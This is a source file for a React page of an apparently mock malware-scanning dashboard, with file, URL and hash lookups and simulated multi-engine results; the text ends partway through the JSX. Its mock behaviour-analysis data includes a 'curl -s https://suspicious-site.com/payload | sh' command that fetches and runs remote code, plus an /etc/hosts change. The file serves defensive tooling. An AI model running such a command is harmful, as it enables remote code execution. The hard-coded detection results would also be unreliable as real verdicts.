"use client"

import type React from "react"

import { useState, useRef, useEffect } from "react"
import { Tabs, TabsList, TabsTrigger, TabsContent } from "@/components/ui/tabs"
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import { Progress } from "@/components/ui/progress"
import { Badge } from "@/components/ui/badge"
import { Table, TableHeader, TableBody, TableRow, TableHead, TableCell } from "@/components/ui/table"
import {
  Shield,
  FileSearch,
  Link2,
  Hash,
  AlertCircle,
  Loader2,
  Info,
  FileUp,
  CheckCircle2,
  XCircle,
  Copy,
  RotateCw,
  ChevronRight,
  Download,
  Clock,
  Search,
  Zap,
  FileText,
  Code,
  Database,
  Lock,
  Eye,
} from "lucide-react"

export default function CyberScanPage() {
  const [scanResults, setScanResults] = useState<any | null>(null)
  const [isScanning, setIsScanning] = useState(false)
  const [scanProgress, setScanProgress] = useState(0)
  const [file, setFile] = useState<File | null>(null)
  const [url, setUrl] = useState("")
  const [hash, setHash] = useState("")
  const [error, setError] = useState<string | null>(null)
  const [copied, setCopied] = useState(false)
  const [scanHistory, setScanHistory] = useState<any[]>([
    {
      id: "scan-001",
      type: "file",
      name: "suspicious_document.pdf",
      hash: "8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4",
      date: new Date(Date.now() - 86400000 * 2).toISOString(), // 2 days ago
      detectionRate: "8/30",
      detectionPercentage: 26.67,
    },
    {
      id: "scan-002",
      type: "url",
      name: "https://example.com/suspicious-page",
      hash: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
      date: new Date(Date.now() - 86400000).toISOString(), // 1 day ago
      detectionRate: "2/30",
      detectionPercentage: 6.67,
    },
    {
      id: "scan-003",
      type: "file",
      name: "setup_installer.exe",
      hash: "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2",
      date: new Date(Date.now() - 3600000 * 3).toISOString(), // 3 hours ago
      detectionRate: "15/30",
      detectionPercentage: 50,
    },
  ])
  const [activeTab, setActiveTab] = useState("file")
  const fileInputRef = useRef<HTMLInputElement>(null)
  const dropZoneRef = useRef<HTMLDivElement>(null)

  // Animation effect for the scan button
  const [scanButtonHover, setScanButtonHover] = useState(false)

  useEffect(() => {
    // Add highlight effect when dragging files over the document
    const handleDragOver = (e: DragEvent) => {
      e.preventDefault()
      if (dropZoneRef.current) {
        dropZoneRef.current.classList.add("border-primary", "bg-primary/5")
      }
    }

    const handleDragLeave = (e: DragEvent) => {
      e.preventDefault()
      if (dropZoneRef.current) {
        dropZoneRef.current.classList.remove("border-primary", "bg-primary/5")
      }
    }

    const handleDrop = (e: DragEvent) => {
      e.preventDefault()
      if (dropZoneRef.current) {
        dropZoneRef.current.classList.remove("border-primary", "bg-primary/5")
      }
    }

    document.addEventListener("dragover", handleDragOver)
    document.addEventListener("dragleave", handleDragLeave)
    document.addEventListener("drop", handleDrop)

    return () => {
      document.removeEventListener("dragover", handleDragOver)
      document.removeEventListener("dragleave", handleDragLeave)
      document.removeEventListener("drop", handleDrop)
    }
  }, [])

  const handleFileDrop = (e: React.DragEvent<HTMLDivElement>) => {
    e.preventDefault()
    if (e.dataTransfer.files && e.dataTransfer.files.length > 0) {
      const droppedFile = e.dataTransfer.files[0]
      if (droppedFile.size > 100 * 1024 * 1024) {
        setError("File size exceeds the 100MB limit")
        return
      }
      setFile(droppedFile)
      setError(null)
    }
  }

  const handleFileSelect = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files.length > 0) {
      const selectedFile = e.target.files[0]
      if (selectedFile.size > 100 * 1024 * 1024) {
        setError("File size exceeds the 100MB limit")
        return
      }
      setFile(selectedFile)
      setError(null)
    }
  }

  const handleFileScan = () => {
    if (!file) return
    setIsScanning(true)
    setScanProgress(0)

    // Simulate scanning progress
    const interval = setInterval(() => {
      setScanProgress((prev) => {
        if (prev >= 100) {
          clearInterval(interval)
          return 100
        }
        return prev + 5
      })
    }, 200)

    // Simulate API call with mock data
    setTimeout(() => {
      clearInterval(interval)
      setScanProgress(100)

      // Mock scan results
      const newScanResult = {
        id: `scan-${Date.now()}`,
        fileName: file.name,
        fileSize: file.size,
        fileType: file.type,
        hash: "8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4",
        scanDate: new Date().toISOString(),
        detectionRate: "4/30",
        detectionPercentage: 13.33,
        scanResults: [
          { engine: "ClamAV", result: "Clean", category: "clean" },
          { engine: "YARA", result: "Suspicious.JS.Obfuscated", category: "suspicious" },
          { engine: "Avast", result: "JS:Miner-C [Trj]", category: "malicious" },
          { engine: "BitDefender", result: "Trojan.JS.Miner.C", category: "malicious" },
          { engine: "Kaspersky", result: "HEUR:Trojan.Script.Miner.gen", category: "malicious" },
          { engine: "Symantec", result: "Clean", category: "clean" },
          { engine: "McAfee", result: "Clean", category: "clean" },
          { engine: "Windows Defender", result: "Clean", category: "clean" },
          { engine: "Sophos", result: "Clean", category: "clean" },
          { engine: "Malwarebytes", result: "Clean", category: "clean" },
        ],
        yaraMatches: [
          {
            rule: "Suspicious.JS.Obfuscated",
            description: "Detects JavaScript with obfuscation techniques commonly used to hide malicious code",
            severity: "Medium",
            tags: ["obfuscation", "evasion", "javascript"],
          },
        ],
        behaviorAnalysis: {
          networkConnections: [
            { destination: "suspicious-mining-pool.com", port: 443, protocol: "HTTPS" },
            { destination: "cdn.legitimate-site.com", port: 443, protocol: "HTTPS" },
          ],
          fileOperations: [
            { operation: "create", path: "/tmp/hidden.bin", timestamp: new Date().toISOString() },
            { operation: "modify", path: "/etc/hosts", timestamp: new Date().toISOString() },
          ],
          processCreation: [
            { process: "bash", commandLine: "-c curl -s https://suspicious-site.com/payload | sh", pid: 1234 },
          ],
        },
      }

      setScanResults(newScanResult)

      // Add to scan history
      setScanHistory((prev) => [
        {
          id: newScanResult.id,
          type: "file",
          name: file.name,
          hash: newScanResult.hash,
          date: newScanResult.scanDate,
          detectionRate: newScanResult.detectionRate,
          detectionPercentage: newScanResult.detectionPercentage,
        },
        ...prev,
      ])

      setIsScanning(false)
    }, 4000)
  }

  const handleUrlScan = (e: React.FormEvent) => {
    e.preventDefault()
    setError(null)

    // Basic URL validation
    if (!url.trim()) {
      setError("Please enter a URL")
      return
    }

    // Check if URL has a valid format
    try {
      const urlObj = new URL(url)
      if (!["http:", "https:"].includes(urlObj.protocol)) {
        setError("URL must start with http:// or https://")
        return
      }
    } catch (err) {
      setError("Please enter a valid URL (e.g., https://example.com)")
      return
    }

    setIsScanning(true)
    setScanProgress(0)

    // Simulate scanning progress
    const interval = setInterval(() => {
      setScanProgress((prev) => {
        if (prev >= 100) {
          clearInterval(interval)
          return 100
        }
        return prev + 4
      })
    }, 150)

    // Simulate API call with mock data
    setTimeout(() => {
      clearInterval(interval)
      setScanProgress(100)

      // Mock scan results
      const newScanResult = {
        id: `scan-${Date.now()}`,
        url: url,
        hash: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        scanDate: new Date().toISOString(),
        detectionRate: "2/30",
        detectionPercentage: 6.67,
        scanResults: [
          { engine: "ClamAV", result: "Clean", category: "clean" },
          { engine: "YARA", result: "Clean", category: "clean" },
          { engine: "Avast", result: "Clean", category: "clean" },
          { engine: "BitDefender", result: "Clean", category: "clean" },
          { engine: "Kaspersky", result: "Clean", category: "clean" },
          { engine: "Symantec", result: "Clean", category: "clean" },
          { engine: "McAfee", result: "Phishing.URL", category: "malicious" },
          { engine: "Windows Defender", result: "Clean", category: "clean" },
          { engine: "Sophos", result: "Malicious.URL", category: "malicious" },
          { engine: "Malwarebytes", result: "Clean", category: "clean" },
        ],
        urlAnalysis: {
          redirectChain: [
            { url: url, statusCode: 301 },
            { url: url.replace("http://", "https://"), statusCode: 200 },
          ],
          ssl: {
            valid: true,
            issuer: "Let's Encrypt Authority X3",
            validFrom: new Date(Date.now() - 86400000 * 30).toISOString(),
            validTo: new Date(Date.now() + 86400000 * 60).toISOString(),
          },
          cookies: [
            { name: "session", secure: true, httpOnly: true },
            { name: "tracking", secure: false, httpOnly: false },
          ],
        },
      }

      setScanResults(newScanResult)

      // Add to scan history
      setScanHistory((prev) => [
        {
          id: newScanResult.id,
          type: "url",
          name: url,
          hash: newScanResult.hash,
          date: newScanResult.scanDate,
          detectionRate: newScanResult.detectionRate,
          detectionPercentage: newScanResult.detectionPercentage,
        },
        ...prev,
      ])

      setIsScanning(false)
    }, 3000)
  }

  const handleHashLookup = (e: React.FormEvent) => {
    e.preventDefault()
    setError(null)

    // Basic hash validation
    if (!hash.trim()) {
      setError("Please enter a SHA256 hash")
      return
    }

    // Check if hash has a valid SHA256 format (64 hex characters)
    const sha256Regex = /^[a-fA-F0-9]{64}$/
    if (!sha256Regex.test(hash)) {
      setError("Please enter a valid SHA256 hash (64 hexadecimal characters)")
      return
    }

    setIsScanning(true)
    setScanProgress(0)

    // Simulate scanning progress
    const interval = setInterval(() => {
      setScanProgress((prev) => {
        if (prev >= 100) {
          clearInterval(interval)
          return 100
        }
        return prev + 10
      })
    }, 100)

    // Simulate API call with mock data
    setTimeout(() => {
      clearInterval(interval)
      setScanProgress(100)

      // Mock scan results
      const newScanResult = {
        id: `scan-${Date.now()}`,
        fileName: "suspicious_document.pdf",
        fileSize: 2457600,
        fileType: "application/pdf",
        hash: hash,
        scanDate: new Date().toISOString(),
        detectionRate: "8/30",
        detectionPercentage: 26.67,
        scanResults: [
          { engine: "ClamAV", result: "PDF.Exploit.CVE-2023-1234", category: "malicious" },
          { engine: "YARA", result: "PDF.Suspicious.Obfuscation", category: "suspicious" },
          { engine: "Avast", result: "PDF:Exploit-AX", category: "malicious" },
          { engine: "BitDefender", result: "Exploit.PDF.Generic.ABC", category: "malicious" },
          { engine: "Kaspersky", result: "HEUR:Exploit.PDF.Generic", category: "malicious" },
          { engine: "Symantec", result: "Trojan.PDF.Exploit", category: "malicious" },
          { engine: "McAfee", result: "Exploit-PDF.h", category: "malicious" },
          { engine: "Windows Defender", result: "Exploit:PDF/CVE-2023-1234", category: "malicious" },
          { engine: "Sophos", result: "Clean", category: "clean" },
          { engine: "Malwarebytes", result: "Clean", category: "clean" },
        ],
        yaraMatches: [
          {
            rule: "PDF.Suspicious.Obfuscation",
            description: "Detects PDF files with obfuscated JavaScript that may contain exploits",
            severity: "High",
            tags: ["pdf", "obfuscation", "exploit"],
          },
        ],
        exploitDetails: {
          cve: "CVE-2023-1234",
          description: "PDF JavaScript API exploitation that allows arbitrary code execution",
          affectedVersions: "Adobe Reader < 22.001.20085",
          mitigationStatus: "Patched in latest version",
        },
      }

      setScanResults(newScanResult)

      // Add to scan history if not already in history
      if (!scanHistory.some((item) => item.hash === hash)) {
        setScanHistory((prev) => [
          {
            id: newScanResult.id,
            type: "hash",
            name: newScanResult.fileName || hash,
            hash: hash,
            date: newScanResult.scanDate,
            detectionRate: newScanResult.detectionRate,
            detectionPercentage: newScanResult.detectionPercentage,
          },
          ...prev,
        ])
      }

      setIsScanning(false)
    }, 1500)
  }

  const handleRescan = (historyItem: any) => {
    if (historyItem.type === "file") {
      // Can't actually rescan the file without the original file
      // So we'll just simulate a new scan with the same hash
      setHash(historyItem.hash)
      setActiveTab("hash")
      setTimeout(() => {
        handleHashLookup(new Event("submit") as any)
      }, 100)
    } else if (historyItem.type === "url") {
      setUrl(historyItem.name)
      setActiveTab("url")
      setTimeout(() => {
        handleUrlScan(new Event("submit") as any)
      }, 100)
    } else {
      setHash(historyItem.hash)
      setActiveTab("hash")
      setTimeout(() => {
        handleHashLookup(new Event("submit") as any)
      }, 100)
    }
  }

  const resetScan = () => {
    setScanResults(null)
    setIsScanning(false)
    setScanProgress(0)
    setFile(null)
    setUrl("")
    setHash("")
    setError(null)
  }

  const copyHash = () => {
    if (scanResults) {
      navigator.clipboard.writeText(scanResults.hash)
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    }
  }

  const formatBytes = (bytes: number, decimals = 2) => {
    if (bytes === 0) return "0 Bytes"
    const k = 1024
    const dm = decimals < 0 ? 0 : decimals
    const sizes = ["Bytes", "KB", "MB", "GB", "TB"]
    const i = Math.floor(Math.log(bytes) / Math.log(k))
    return Number.parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + " " + sizes[i]
  }

  const formatDate = (date: string) => {
    return new Date(date).toLocaleString()
  }

  const getDetectionColor = (percentage: number) => {
    if (percentage === 0) return "success"
    if (percentage < 10) return "secondary"
    if (percentage < 30) return "default"
    return "destructive"
  }

  const getResultBadge = (category: string) => {
    switch (category) {
      case "clean":
        return (
          <Badge variant="success" className="w-20 justify-center">
            Clean
          </Badge>
        )
      case "suspicious":
        return (
          <Badge variant="secondary" className="w-20 justify-center">
            Suspicious
          </Badge>
        )
      case "malicious":
        return (
          <Badge variant="destructive" className="w-20 justify-center">
            Malicious
          </Badge>
        )
      default:
        return (
          <Badge variant="outline" className="w-20 justify-center">
            Unknown
          </Badge>
        )
    }
  }

  const getResultIcon = (category: string) => {
    switch (category) {
      case "clean":
        return <CheckCircle2 className="h-5 w-5 text-green-500" />
      case "suspicious":
        return <AlertCircle className="h-5 w-5 text-yellow-500" />
      case "malicious":
        return <XCircle className="h-5 w-5 text-red-500" />
      default:
        return <AlertCircle className="h-5 w-5 text-muted-foreground" />
    }
  }

  // File Upload Zone Component
  const FileUploadZone = () => {
    return (
      <div className="space-y-4">
        <Card
          className={`border-dashed ${isScanning ? "opacity-75" : ""} transition-all duration-300`}
          onDragOver={(e) => e.preventDefault()}
          onDrop={handleFileDrop}
          ref={dropZoneRef}
        >
          <CardContent className="p-6">
            <div className="flex flex-col items-center justify-center p-8 text-center rounded-md cursor-pointer bg-muted/30 transition-colors duration-200">
              {isScanning ? (
                <div className="flex flex-col items-center gap-4 py-8">
                  <Loader2 className="h-10 w-10 text-primary animate-spin" />
                  <div className="text-lg font-medium">Scanning file...</div>
                  <div className="w-full max-w-md">
                    <Progress value={scanProgress} className="h-2" />
                    <div className="flex justify-between mt-2 text-sm text-muted-foreground">
                      <span>Analyzing...</span>
                      <span>{scanProgress}%</span>
                    </div>
                  </div>
                </div>
              ) : file ? (
                <div className="flex flex-col items-center gap-4 py-4">
                  <div className="h-16 w-16 rounded-full bg-primary/10 flex items-center justify-center">
                    <FileUp className="h-8 w-8 text-primary" />
                  </div>
                  <div>
                    <div className="text-lg font-medium truncate max-w-xs">{file.name}</div>
                    <div className="text-sm text-muted-foreground">{formatBytes(file.size)}</div>
                  </div>
                </div>
              ) : (
                <>
                  <div className="h-16 w-16 rounded-full bg-primary/10 flex items-center justify-center mb-4">
                    <FileUp className="h-8 w-8 text-primary" />
                  </div>
                  <h3 className="text-lg font-medium mb-2">Drag & drop file here</h3>
                  <p className="text-sm text-muted-foreground mb-4 max-w-md">
                    Upload any file to scan for malware, viruses, and other threats. Maximum file size: 100MB.
                  </p>
                  <label htmlFor="file-upload">
                    <Button
                      variant="outline"
                      className="border-primary/50 text-primary hover:bg-primary/10 hover:text-primary"
                    >
                      Select File
                    </Button>
                    <input
                      id="file-upload"
                      type="file"
                      className="hidden"
                      onChange={handleFileSelect}
                      ref={fileInputRef}
                    />
                  </label>
                </>
              )}
            </div>
          </CardContent>
        </Card>
  
        {error && (
          <div className="flex items-center gap-2 text-destructive text-sm p-2 bg-destructive/10 rounded-md">
            <AlertCircle className="h-4 w-4" />
            <span>{error}</span>
          </div>
        )}
  
        <div className="flex gap-4 justify-end">
          {file && !isScanning && (
            <>
              <Button variant="outline" onClick={resetScan} disabled={isScanning}>
                Reset
              </Button>
              <Button
                variant="default"
                onClick={handleFileScan}
                disabled={isScanning || !file}
                className="relative overflow-hidden group"
                onMouseEnter={() => setScanButtonHover(true)}
                onMouseLeave={() => setScanButtonHover(false)}
              >
                <span className="relative z-10 flex items-center gap-2">
                  <Zap className={`h-4 w-4 ${scanButtonHover ? "animate-pulse" : ""}`} />
                  Scan Now
                </span>
                <span
                  className={`absolute inset-0 bg-gradient-to-r from-cyan-500 to-blue-500 opacity-0 group-hover:opacity-100 transition-opacity duration-300`}
                ></span>
              </Button>
            </>
          )}
        </div>
      </div>
    )
  }

  // URL Scan Input Component
  const UrlScanInput = () => {
    return (
      <div className="space-y-4">
        <Card>
          <CardContent className="p-6">
            <div className="flex flex-col items-center gap-6 p-4 text-center rounded-md">
              {isScanning ? (
                <div className="flex flex-col items-center gap-4 py-8 w-full">
                  <Loader2 className="h-10 w-10 text-primary animate-spin" />
                  <div className="text-lg font-medium">Scanning URL...</div>
                  <div className="w-full max-w-md">
                    <Progress value={scanProgress} className="h-2" />
                    <div className="flex justify-between mt-2 text-sm text-muted-foreground">
                      <span>Analyzing...</span>
                      <span>{scanProgress}%</span>
                    </div>
                  </div>
                </div>
              ) : (
                <>
                  <div className="h-16 w-16 rounded-full bg-primary/10 flex items-center justify-center">
                    <Link2 className="h-8 w-8 text-primary" />
                  </div>
                  <div>
                    <h3 className="text-lg font-medium mb-2">Enter URL to scan</h3>
                    <p className="text-sm text-muted-foreground mb-6 max-w-md">
                      Scan any website for malicious content, phishing attempts, and security vulnerabilities.
                    </p>
                  </div>

                  <form onSubmit={handleUrlScan} className="w-full max-w-md space-y-4">
                    <div className="flex gap-2">
                      <Input
                        type="text"
                        placeholder="https://example.com"
                        value={url}
                        onChange={(e) => setUrl(e.target.value)}
                        className="flex-1"
                      />
                      <Button
                        type="submit"
                        disabled={isScanning}
                        className="relative overflow-hidden group"
                        onMouseEnter={() => setScanButtonHover(true)}
                        onMouseLeave={() => setScanButtonHover(false)}
                      >
                        <span className="relative z-10 flex items-center gap-2">
                          <Zap className={`h-4 w-4 ${scanButtonHover ? "animate-pulse" : ""}`} />
                          Scan
                        </span>
                        <span
                          className={`absolute inset-0 bg-gradient-to-r from-cyan-500 to-blue-500 opacity-0 group-hover:opacity-100 transition-opacity duration-300`}
                        ></span>
                      </Button>
                    </div>

                    {error && (
                      <div className="flex items-center gap-2 text-destructive text-sm p-2 bg-destructive/10 rounded-md">
                        <AlertCircle className="h-4 w-4" />
                        <span>{error}</span>
                      </div>
                    )}
                  </form>
                </>
              )}
            </div>
          </CardContent>
        </Card>
      </div>
    )
  }

  // Hash Lookup Form Component
  const HashLookupForm = () => {
    return (
      <div className="space-y-4">
        <Card>
          <CardContent className="p-6">
            <div className="flex flex-col items-center gap-6 p-4 text-center rounded-md">
              {isScanning ? (
                <div className="flex flex-col items-center gap-4 py-8 w-full">
                  <Loader2 className="h-10 w-10 text-primary animate-spin" />
                  <div className="text-lg font-medium">Looking up hash...</div>
                  <div className="w-full max-w-md">
                    <Progress value={scanProgress} className="h-2" />
                    <div className="flex justify-between mt-2 text-sm text-muted-foreground">
                      <span>Searching database...</span>
                      <span>{scanProgress}%</span>
                    </div>
                  </div>
                </div>
              ) : (
                <>
                  <div className="h-16 w-16 rounded-full bg-primary/10 flex items-center justify-center">
                    <Hash className="h-8 w-8 text-primary" />
                  </div>
                  <div>
                    <h3 className="text-lg font-medium mb-2">SHA256 Hash Lookup</h3>
                    <p className="text-sm text-muted-foreground mb-6 max-w-md">
                      Check if a file has already been scanned by entering its SHA256 hash.
                    </p>
                  </div>

                  <form onSubmit={handleHashLookup} className="w-full max-w-md space-y-4">
                    <Input
                      type="text"
                      placeholder="Enter SHA256 hash"
                      value={hash}
                      onChange={(e) => setHash(e.target.value)}
                      className="font-mono text-sm"
                    />

                    <div className="flex items-center gap-2 text-muted-foreground text-xs p-2 bg-muted/50 rounded-md">
                      <Info className="h-4 w-4 shrink-0" />
                      <span>Example: 8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4</span>
                    </div>

                    {error && (
                      <div className="flex items-center gap-2 text-destructive text-sm p-2 bg-destructive/10 rounded-md">
                        <AlertCircle className="h-4 w-4" />
                        <span>{error}</span>
                      </div>
                    )}

                    <Button
                      type="submit"
                      className="w-full relative overflow-hidden group"
                      disabled={isScanning}
                      onMouseEnter={() => setScanButtonHover(true)}
                      onMouseLeave={() => setScanButtonHover(false)}
                    >
                      <span className="relative z-10 flex items-center gap-2 justify-center">
                        <Search className={`h-4 w-4 ${scanButtonHover ? "animate-pulse" : ""}`} />
                        Lookup Hash
                      </span>
                      <span
                        className={`absolute inset-0 bg-gradient-to-r from-cyan-500 to-blue-500 opacity-0 group-hover:opacity-100 transition-opacity duration-300`}
                      ></span>
                    </Button>
                  </form>
                </>
              )}
            </div>
          </CardContent>
        </Card>
      </div>
    )
  }

  // History Component
  const ScanHistoryTable = () => {
    return (
      <div className="space-y-4">
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Clock className="h-5 w-5 text-primary" />
              Recent Scan History
            </CardTitle>
            <CardDescription>View and manage your previous scan reports</CardDescription>
          </CardHeader>
          <CardContent>
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead className="w-[50px]">Type</TableHead>
                  <TableHead>Name</TableHead>
                  <TableHead>Detection</TableHead>
                  <TableHead>Date</TableHead>
                  <TableHead className="text-right">Actions</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {scanHistory.map((item, index) => (
                  <TableRow key={index}>
                    <TableCell>
                      {item.type === "file" ? (
                        <FileText className="h-4 w-4 text-primary" />
                      ) : item.type === "url" ? (
                        <Link2 className="h-4 w-4 text-primary" />
                      ) : (
                        <Hash className="h-4 w-4 text-primary" />
                      )}
                    </TableCell>
                    <TableCell className="font-medium">
                      <div className="flex flex-col">
                        <span className="truncate max-w-[200px]">{item.name}</span>
                        <span className="text-xs text-muted-foreground font-mono truncate">
                          {item.hash.substring(0, 16)}...
                        </span>
                      </div>
                    </TableCell>
                    <TableCell>
                      <Badge
                        variant={
                          item.detectionPercentage === 0
                            ? "success"
                            : item.detectionPercentage < 10
                              ? "secondary"
                              : item.detectionPercentage < 30
                                ? "default"
                                : "destructive"
                        }
                      >
                        {item.detectionRate}
                      </Badge>
                    </TableCell>
                    <TableCell>{new Date(item.date).toLocaleString()}</TableCell>
                    <TableCell className="text-right">
                      <div className="flex justify-end gap-2">
                        <Button variant="ghost" size="sm" onClick={() => handleRescan(item)}>
                          <RotateCw className="h-4 w-4" />
                          <span className="sr-only">Rescan</span>
                        </Button>
                        <Button variant="ghost" size="sm" onClick={() => navigator.clipboard.writeText(item.hash)}>
                          <Copy className="h-4 w-4" />
                          <span className="sr-only">Copy Hash</span>
                        </Button>
                      </div>
                    </TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </CardContent>
        </Card>
      </div>
    )
  }

  // Scan Results Dashboard Component
  const ScanResultsDashboard = () => {
    return (
      <div className="max-w-4xl mx-auto">
        <div className="flex flex-col md:flex-row gap-6 mb-8">
          {/* Summary Card */}
          <Card className="flex-1">
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Shield className="h-5 w-5 text-primary" />
                Scan Results
              </CardTitle>
              <CardDescription>{scanResults.fileName ? "File scan completed" : "URL scan completed"}</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="flex flex-col gap-4">
                {scanResults.fileName && (
                  <>
                    <div className="flex justify-between">
                      <span className="text-sm text-muted-foreground">File Name:</span>
                      <span className="text-sm font-medium truncate max-w-[250px]">{scanResults.fileName}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-sm text-muted-foreground">File Size:</span>
                      <span className="text-sm font-medium">{formatBytes(scanResults.fileSize)}</span>
                    </div>
                  </>
                )}

                {scanResults.url && (
                  <div className="flex justify-between">
                    <span className="text-sm text-muted-foreground">URL:</span>
                    <span className="text-sm font-medium truncate max-w-[250px]">{scanResults.url}</span>
                  </div>
                )}

                <div className="flex justify-between items-center">
                  <span className="text-sm text-muted-foreground">SHA256:</span>
                  <div className="flex items-center gap-1">
                    <span className="text-sm font-mono truncate max-w-[200px]">
                      {scanResults.hash.substring(0, 16)}...
                    </span>
                    <Button variant="ghost" size="sm" className="h-6 w-6 p-0" onClick={copyHash}>
                      {copied ? <CheckCircle2 className="h-3 w-3" /> : <Copy className="h-3 w-3" />}
                    </Button>
                  </div>
                </div>

                <div className="flex justify-between">
                  <span className="text-sm text-muted-foreground">Scan Date:</span>
                  <span className="text-sm font-medium">{formatDate(scanResults.scanDate)}</span>
                </div>
              </div>
            </CardContent>
          </Card>

          {/* Detection Card */}
          <Card className="flex-1">
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Shield className="h-5 w-5 text-primary" />
                Detection Summary
              </CardTitle>
              <CardDescription>{scanResults.detectionRate} engines detected threats</CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div className="flex items-center justify-center">
                <div className="relative h-32 w-32">
                  <div className="absolute inset-0 flex items-center justify-center">
                    <div className={`text-3xl font-bold text-${getDetectionColor(scanResults.detectionPercentage)}`}>
                      {scanResults.detectionPercentage}%
                    </div>
                  </div>
                  <svg className="h-32 w-32" viewBox="0 0 100 100">
                    <circle
                      cx="50"
                      cy="50"
                      r="45"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth="10"
                      className="text-muted/20"
                    />
                    <circle
                      cx="50"
                      cy="50"
                      r="45"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth="10"
                      className={`text-${getDetectionColor(scanResults.detectionPercentage)}`}
                      strokeDasharray="283"
                      strokeDashoffset={283 - (283 * scanResults.detectionPercentage) / 100}
                      transform="rotate(-90 50 50)"
                    />
                  </svg>
                </div>
              </div>

              <div className="grid grid-cols-3 gap-2 text-center">
                <div className="flex flex-col items-center p-2 rounded-md bg-muted/30">
                  <CheckCircle2 className="h-5 w-5 text-green-500 mb-1" />
                  <span className="text-xs text-muted-foreground">Clean</span>
                  <span className="text-sm font-medium">
                    {scanResults.scanResults.filter((r: any) => r.category === "clean").length}
                  </span>
                </div>
                <div className="flex flex-col items-center p-2 rounded-md bg-muted/30">
                  <AlertCircle className="h-5 w-5 text-yellow-500 mb-1" />
                  <span className="text-xs text-muted-foreground">Suspicious</span>
                  <span className="text-sm font-medium">
                    {scanResults.scanResults.filter((r: any) => r.category === "suspicious").length}
                  </span>
                </div>
                <div className="flex flex-col items-center p-2 rounded-md bg-muted/30">
                  <XCircle className="h-5 w-5 text-red-500 mb-1" />
                  <span className="text-xs text-muted-foreground">Malicious</span>
                  <span className="text-sm font-medium">
                    {scanResults.scanResults.filter((r: any) => r.category === "malicious").length}
                  </span>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Results Tabs */}
        <Tabs defaultValue="scan-results" className="w-full">
          <TabsList className="grid grid-cols-4 w-full mb-6">
            <TabsTrigger value="scan-results" className="flex items-center gap-2">
              <Shield className="h-4 w-4" />
              <span>Scan Results</span>
            </TabsTrigger>
            <TabsTrigger value="details" className="flex items-center gap-2">
              <FileSearch className="h-4 w-4" />
              <span>Detailed Analysis</span>
            </TabsTrigger>
            <TabsTrigger value="behavior" className="flex items-center gap-2">
              <Code className="h-4 w-4" />
              <span>Behavior</span>
            </TabsTrigger>
            <TabsTrigger value="sandbox" className="flex items-center gap-2">
              <Database className="h-4 w-4" />
              <span>Sandbox</span>
            </TabsTrigger>
          </TabsList>

          <TabsContent value="scan-results">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Shield className="h-5 w-5 text-primary" />
                  Engine Results
                </CardTitle>
                <CardDescription>Results from multiple security engines</CardDescription>
              </CardHeader>
              <CardContent>
                <Table>
                  <TableHeader>
                    <TableRow>
                      <TableHead className="w-[50px]">Status</TableHead>
                      <TableHead>Engine</TableHead>
                      <TableHead>Result</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {scanResults.scanResults.map((result: any, index: number) => (
                      <TableRow key={index}>
                        <TableCell>{getResultIcon(result.category)}</TableCell>
                        <TableCell className="font-medium">{result.engine}</TableCell>
                        <TableCell>
                          {getResultBadge(result.category)}{" "}
                          {result.result !== "Clean" && (
                            <span className="ml-2 text-sm text-muted-foreground">{result.result}</span>
                          )}
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </CardContent>
              <CardFooter className="flex justify-between">
                <Button variant="outline" onClick={resetScan}>
                  <RotateCw className="h-4 w-4 mr-2" />
                  New Scan
                </Button>
                <div className="flex gap-2">
                  <Button variant="outline">
                    <Download className="h-4 w-4 mr-2" />
                    Export Report
                  </Button>
                  <Button variant="default">
                    <Shield className="h-4 w-4 mr-2" />
                    Deep Analysis
                    <ChevronRight className="h-4 w-4 ml-1" />
                  </Button>
                </div>
              </CardFooter>
            </Card>
          </TabsContent>

          <TabsContent value="details">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <FileSearch className="h-5 w-5 text-primary" />
                  Detailed Analysis
                </CardTitle>
                <CardDescription>In-depth technical details and YARA matches</CardDescription>
              </CardHeader>
              <CardContent className="space-y-6">
                <div className="space-y-4">
                  <h3 className="text-sm font-medium">File Properties</h3>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4 p-4 rounded-md bg-muted/30">
                    {scanResults.fileName && (
                      <>
                        <div className="flex flex-col">
                          <span className="text-xs text-muted-foreground">File Name</span>
                          <span className="text-sm">{scanResults.fileName}</span>
                        </div>
                        <div className="flex flex-col">
                          <span className="text-xs text-muted-foreground">File Size</span>
                          <span className="text-sm">{formatBytes(scanResults.fileSize)}</span>
                        </div>
                        <div className="flex flex-col">
                          <span className="text-xs text-muted-foreground">File Type</span>
                          <span className="text-sm">{scanResults.fileType}</span>
                        </div>
                      </>
                    )}

                    {scanResults.url && (
                      <div className="flex flex-col md:col-span-2">
                        <span className="text-xs text-muted-foreground">URL</span>
                        <span className="text-sm break-all">{scanResults.url}</span>
                      </div>
